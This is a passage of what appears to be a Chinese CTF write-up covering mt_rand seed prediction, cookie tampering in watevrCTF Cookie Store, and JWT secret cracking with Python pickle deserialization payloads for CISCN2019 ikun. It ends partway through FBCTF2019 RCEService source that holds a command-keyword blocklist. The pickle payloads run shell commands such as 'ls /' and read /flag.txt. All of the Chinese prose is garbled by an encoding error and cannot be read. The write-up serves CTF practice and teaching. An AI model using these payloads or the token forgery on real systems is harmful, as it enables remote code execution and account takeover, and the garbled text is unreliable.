<br></code></pre></td></tr></table></figure><p>å¼ºç­‰äºç»•è¿‡è‚¯å®šä¸è¦æƒ³äº†ï¼Œæœäº†ä¸€ä¸‹<code>mt_rand</code>ç»•è¿‡ï¼š<code>https://www.freebuf.com/vuls/192012.html</code></p><p>é‡ç‚¹å°±æ˜¯<code>mt_rand</code>è¿™ä¸œè¥¿ç”±å¯ç¡®å®šçš„å‡½æ•°ï¼Œé€šè¿‡ä¸€ä¸ªç§å­äº§ç”Ÿçš„ä¼ªéšæœºæ•°ã€‚è¿™æ„å‘³ç€ï¼šå¦‚æœçŸ¥é“äº†ç§å­ï¼Œæˆ–è€…å·²ç»äº§ç”Ÿçš„éšæœºæ•°ï¼Œéƒ½å¯èƒ½è·å¾—æ¥ä¸‹æ¥éšæœºæ•°åºåˆ—çš„ä¿¡æ¯ï¼ˆå¯é¢„æµ‹æ€§ï¼‰ã€‚</p><p>ç»™äº†åºåˆ—å’Œå‰åä½ï¼Œæˆ‘ä»¬å…ˆå°†å‰åä½è¿˜åŸæˆä¸ºç”Ÿæˆçš„éšæœºæ•°ï¼Œç„¶åæ‹¼æ¥å½¢æˆ<code>php_mt_seed</code>éœ€è¦çš„å‚æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$string</span>=<span class="hljs-string">&#x27;B8F2IQkNd6&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br><span class="hljs-variable">$pos</span>=<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str_long1</span>,<span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//strposä¼šè¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä»0å¼€å§‹</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$pos</span>.<span class="hljs-string">&quot; 0 61 &quot;</span> ;  <span class="hljs-comment">//é•¿åº¦62ï¼Œä»0åˆ°61</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//37 37 0 61 34 34 0 61 41 41 0 61 28 28 0 61 44 44 0 61 52 52 0 61 10 10 0 61 49 49 0 61 3 3 0 61 32 32 0 61 </span><br>    <br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">547943121</span>);    <span class="hljs-comment">//åœ¨è¿™é‡Œå¡«å…¥è·å¾—çš„ç§å­</span><br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-keyword">echo</span>(<span class="hljs-variable">$str</span>);<br><br><span class="hljs-comment">//B8F2IQkNd6gc0fOa7AvT</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/choujiang3.png" alt="choujiang3"></p><p>åˆ©ç”¨ç§å­ç”Ÿæˆéšæœºæ•°å†ç”Ÿæˆå¯†ç åæ³¨æ„å’Œå‰åä½å¯¹ä¸€ä¸‹(PHPç‰ˆæœ¬ä¸åŒç”Ÿæˆçš„ç»“æœä¸åŒ)</p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>å•†åº—ç±»å‹é¢˜ç›®ï¼š</p><p><img src="/img/cookiestore1.png" alt="cookiestore1"></p><p>æœ€å¼€å§‹æœ‰<code>50</code>ï¼Œè´­ä¹°<code>FLAG</code>éœ€è¦<code>100</code>ï¼Œè´­ä¹°æ—¶æŠ“åŒ…çœ‹ä¸‹è¿‡ç¨‹ï¼š</p><p><img src="/img/cookieeeestore2.png" alt="cookieeeestore2"></p><p>æ³¨æ„è¿™æ®µ<code>cookie</code>ï¼Œæ•°å­—å¤§å°å†™å­—æ¯æ··åˆç­‰å·ç»“å°¾ï¼Œçœ‹ç€åƒ<code>base64</code>ï¼Œè§£ç ï¼š</p><p><img src="/img/cookiestore3.png" alt="cookiestore3"></p><p>ä»¥<code>JSON</code>æ ¼å¼å­˜æœ‰é’±å’Œå†å²è´­ä¹°è®°å½•ï¼Œç›´æ¥ä¿®æ”¹<code>money</code>ä¸º<code>10000</code>:</p><p><img src="/img/cookiestore4.png" alt="cookiestore4"></p><p>è´­ä¹°<code>flag</code>ç„¶åæŠŠ<code>cookie</code>æ¢äº†å°±è¡Œï¼Œä¹°å®Œ<code>flag</code>æ˜¯å¤šå°‘ä¼šè‡ªå·±æ˜¾ç¤ºã€‚</p><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>é¢˜ç›®æç¤º<code>python,pickle</code>ï¼Œåº”è¯¥æ˜¯<code>pickle</code>çš„ååºåˆ—åŒ–æ¼æ´</p><p><img src="/img/kun1.png" alt="kun1"></p><p><img src="/img/kun2.png" alt="kun2"></p><p>ç›®æµ‹æ˜¯è¦é€šè¿‡æ•°æ®åŒ…ä¿®æ”¹ä¹°ä¸ª<code>lv6</code>çš„è´¦å·ï¼Œä¸è¿‡è¿™ä¸ªè´¦å·æœ‰å¾ˆå¤šé¡µè¦ä¸€é¡µä¸€é¡µç¿»(ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬è¯•è¯•)ï¼Ÿå…ˆæ³¨å†Œçœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/kun3.png" alt="kun3"></p><p>å¯ä»¥çœ‹åˆ°åˆšè¿›å»æˆ‘ä»¬æ˜¯æœ‰<code>1000</code>çš„å¯åŠ¨èµ„é‡‘ï¼Œé¡µé¢<code>URL:http://7e29da18-470a-4d1c-99c1-70e88eff89f1.node4.buuoj.cn:81/shop?page=2</code> ï¼Œå†™ä¸ªè„šæœ¬æ‰¾<code>lv6</code>çš„ç•Œé¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>æœ€å¼€å§‹è¿™ä¸ªè„šæœ¬è·‘çš„æ—¶å€™ç›´æ¥å›æ˜¾äº†<code>1</code>ï¼Œä½†ç¬¬ä¸€é¡µå¹¶æ²¡æœ‰<code>lv6</code>è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘åŠ äº†ä¸ª<code>print(r.text)</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><img src="/img/kun5.png" alt="kun5"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å­—ç¬¦å®åœ¨å¤ªå¤šï¼Œå¯èƒ½æœ‰å…¶å®ƒä¸œè¥¿è§¦å‘äº†<code>lv6</code>è¿™ä¸ªå…³é”®å­—ï¼Œçœ‹äº†æºç å‘ç°å®ƒçš„<code>lv</code>æ˜¯æœ‰ä¸€å®šæ ¼å¼çš„ï¼Œæ¯”å¦‚ï¼š</p><p><img src="/img/kun6.png" alt="kun6"></p><p>æ‰€ä»¥æŠŠ<code>lv6</code>æ”¹æˆ<code>lv6.png</code>å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">250</span>):<br>    time.sleep(<span class="hljs-number">0.2</span>)<br>    url = <span class="hljs-string">&#x27;http://ba07199e-5e59-4fe6-9118-5e18bdb18360.node4.buuoj.cn:81/shop?page=&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>    res = requests.get(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;lv6.png&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment"># 181</span><br></code></pre></td></tr></table></figure><p>æœç„¶åœ¨<code>181</code>é¡µå‘ç°äº†æˆ‘ä»¬éœ€è¦çš„ï¼š</p><p><img src="/img/kun7.png" alt="kun7"></p><p><img src="/img/kun8.png" alt="kun8"></p><p>å¾ˆæ˜æ˜¾æˆ‘ä»¬é’±ä¸å¤Ÿï¼ŒæŠ“åŒ…çœ‹çœ‹èƒ½ä¸èƒ½ä¿®æ”¹å•¥çš„ï¼š</p><p><img src="/img/kun9.png" alt="kun9"></p><p>æ³¨æ„è¿™é‡Œçš„<code>price</code>å’Œ<code>discount</code>ï¼Œæˆ‘ä»¬åªæœ‰ä¸€åƒå—ï¼Œæˆ‘ä¸€å¼€å§‹æŠŠä»·æ ¼æ”¹æˆ<code>1</code>äº†ä½†å‘ç°ä¸è¡Œã€‚ã€‚åªèƒ½é€šè¿‡ä¿®æ”¹æŠ˜æ‰£è´­ä¹°(0.0000000001)ï¼š</p><p><img src="/img/kun10.png" alt="kun10"></p><p>å…¶å®æ˜¯ä¸ª302é‡å®šå‘ï¼Œå®šå‘åˆ°äº†<code>b1g_m4mber</code>é¡µé¢ï¼Œä½†æç¤ºæˆ‘ä»¬åªæœ‰<code>admin</code>å¯ä»¥è®¿é—®ï¼š</p><p><img src="/img/kun11.png" alt="kun11"></p><p>å…¶å®è¿™é‡Œå°±æœ‰ç‚¹æ€è·¯äº†ï¼Œæ ¹æ®é¢˜ç›®æç¤º<code>python,pickle</code>ç°åœ¨åªå…è®¸ç®¡ç†å‘˜è®¿é—®ï¼Œé‚£å¤§æ¦‚ç‡æ˜¯åœ¨<code>cookie</code>ä¸­æ‰¾çº¿ç´¢äº†(æ³¨æ„è¿™é‡Œçš„<code>JWT</code>å­—æ®µ)ï¼š</p><p><img src="/img/kun12.png" alt="kun12"></p><p>å…ˆæŠŠ<code>JWT</code>è§£ç ï¼š<code>(https://www.bejson.com/jwt/)</code></p><p><img src="/img/kun13.png" alt="kun13"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ®µ<code>JWT</code>æ˜¯åŒ…å«ç€æˆ‘ä»¬ç”¨æˆ·åçš„æ•°æ®ï¼Œæˆ‘ä¸€å¼€å§‹æƒ³çš„æ˜¯è‚¯å®šæœ‰ä»€ä¹ˆå­—æ®µåŒ…å«ç€<code>guest</code>ä¹‹ç±»çš„ä¸œè¥¿ï¼Œç„¶åæŠŠå®ƒæ”¹æˆ<code>admin</code>åŠ å¯†ä¼ è¿‡å»ã€‚ã€‚ä½†æ£é¼“äº†åŠå¤©ä¸çŸ¥é“è¿™ä¸ªå­—æ®µè—åœ¨å“ªäº†ï¼Œåé¢å‚è€ƒäº†å…¶å®ƒå¸ˆå‚…çš„wpå‘ç°åŸæ¥æ”¹ä¸ª<code>username</code>å°±è¡Œã€‚ã€‚ã€‚å…ˆåˆ©ç”¨<code>jwtcrack</code>çˆ†ç ´è¿™ä¸ª<code>JWT</code>:</p><p><img src="/img/kun14.png" alt="kun14"></p><p><code>1Kun</code></p><p><img src="/img/kun15.png"></p><p><img src="/img/kun16.png" alt="kun16"></p><p>ç‚¹è¿™ä¸ªæˆä¸ºå¤§ä¼šå‘˜çš„æŒ‰é’®æ²¡å•¥ååº”ã€‚ã€‚çœ‹æºç æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/kun17.png" alt="kun17"></p><p>è®¿é—®<code>ef235c7d-6775-4801-a866-8532c547a07c.node4.buuoj.cn:81/static/asd1f654e683wq/www.zip</code>ï¼Œä¸‹è½½æºç ï¼š</p><p>æ ¹æ®æç¤ºæˆ‘ä»¬æ‰¾å’Œ<code>pickle</code>æœ‰å…³çš„åºåˆ—åŒ–ååºåˆ—åŒ–æ“ä½œå°±è¡Œï¼š</p><p><code>pickle.loads</code>å­˜åœ¨äº<code>Admin.py</code>ä¸­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™éƒ¨åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">become = self.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br><span class="hljs-comment">#è§£ç URLç¼–ç çš„æ•°æ®ï¼Œç„¶åå°†ç»“æœä¼ é€’ç»™pickle.loadsè¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</span><br><span class="hljs-comment">#æˆ‘ä»¬çš„payloadå¯ä»¥å†™æˆï¼š</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urlib.parse<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br><br>a = pickle.dumps(Note())<br>a = urllib.parse.quote(a)<br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment">#%80%04%95%3F%00%00%00%00%00%00%00%8C%08builtins%94%8C%04eval%94%93%94%8C%23__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%94%85%94R%94.</span><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç åœ¨æˆ‘çš„<code>Kali</code>ä¸‹å¯ä»¥è¿è¡Œï¼Œä½†æ”¾åˆ°é¢˜ç›®ä¸­æ²¡ç”¨ï¼Œä¸çŸ¥é“å•¥åŸå› å»çœ‹äº†<code>wp</code>ï¼š</p><p>é¢˜ç›®çš„æºç æ˜¯ç”¨python2å†™çš„ï¼Œè€Œä¸”pickleè¿™ä¸œè¥¿ä¸æ”¯æŒè·¨ç‰ˆæœ¬æ“ä½œï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯python2å¯ä»¥ä»ä¸‹é¢è¿™å‡ ä¸ªä¾‹å­çœ‹å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(ex)  <span class="hljs-comment">#python2ä¸­printæ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå› æ­¤åœ¨ä½¿ç”¨printè¯­å¥æ—¶ä¸éœ€è¦ä½¿ç”¨æ‹¬å·ï¼Œä½†åœ¨python3ä¸­è¿™ä¸œè¥¿æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¦åŠ æ‹¬å·ã€‚</span><br>p = pickle.loads(urllib.unquote(become))<br>    <span class="hljs-comment">#å…¶å®è¿™æ®µä»£ç å°±æ˜¯æŠŠbecomeç»è¿‡URLè§£ç ç»•åè¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼Œå¦‚æœåœ¨python3ä¸­è¿è¡Œè¿™ä¸ªä¼šæç¤ºæ²¡æœ‰unquoteè¿™ä¸ªæ–¹æ³•ï¼Œè¿™ä¸œè¥¿è¢«ç§»åŠ¨åˆ°urllib.parseæ¨¡å—ä¸­ï¼Œéœ€è¦from urllib.parse import unquoteç„¶åç›´æ¥a=quote(a)å°±è¡Œã€‚</span><br><span class="hljs-comment">#æ‰€ä»¥æˆ‘ä»¬è¦ç”¨python2å†™ï¼š</span><br><span class="hljs-comment">#`python2`åœ¨çº¿å·¥å…·ï¼š`https://c.runoob.com/compile/6/`</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(Note())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span> a<br><br><span class="hljs-comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22__import__%28%27os%27%29.popen%28%27ls%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/kun18.png" alt="kun18"></p><p>åé¢å°±ä¸è¯¦ç»†å†™äº†ï¼Œæ”¹æˆ<code>ls / </code>ç„¶å<code>cat /flag.txt</code>è¯»å°±è¡Œ</p><p>å…¶å®è¿™é“é¢˜<code>payload</code>çš„å†™æ³•å¾ˆå¤šï¼Œæˆ‘è§‰å¾—æˆ‘è¿™ä¸ªå¹¶ä¸å¥½(å› ä¸ºç›´æ¥åˆ©ç”¨äº†<code>import</code>å’Œ<code>os</code>ï¼Œæ„Ÿè§‰åœ¨æœ‰äº›é¢˜ä¸­ä¼šè¢«è¿‡æ»¤æ‰ã€‚ã€‚è¿™é‡Œè¡¥å……ä¸€äº›å…¶ä»–å¸ˆå‚…çš„<code>payload</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>a = payload()<br><span class="hljs-built_in">print</span> (urllib.quote(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span> ,))<br><br>a = Test()<br>s = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(urllib.quote(s))<br></code></pre></td></tr></table></figure><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="/img/rceservice.png" alt="rceservice"></p><p>è¦æ±‚è¾“å…¥å¿…é¡»æ˜¯<code>JSON</code>æ ¼å¼ï¼Œç±»ä¼¼{â€œxxxâ€:â€xxxâ€}è¿™æ ·ï¼Œå¦‚æœåé¢é‚£ä¸ªæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤é‚£å‰é¢çš„é”®è¯¥æ˜¯å¤šå°‘ï¼Ÿé¢˜ç›®ä¹Ÿæ²¡å•¥æç¤ºã€‚ã€‚æ‰¾äº†<code>wp</code>å‘ç°è¿™é¢˜å…¶å®æ˜¯ç»™äº†æºç çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<span class="hljs-comment">//æ³¨æ„è¿™ä¸ªç¯å¢ƒå˜é‡çš„é…ç½®ï¼Œæœ€å¼€å§‹æ²¡æ³¨æ„è¿™ä¸ªä¸œè¥¿å¯¼è‡´æœ‰äº›å‘½ä»¤æ‰§è¡Œä¸äº†</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123; <span class="hljs-comment">//é™åˆ¶å¿…é¡»æ˜¯å­—ç¬¦ä¸²æ ¼å¼</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>  &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<span 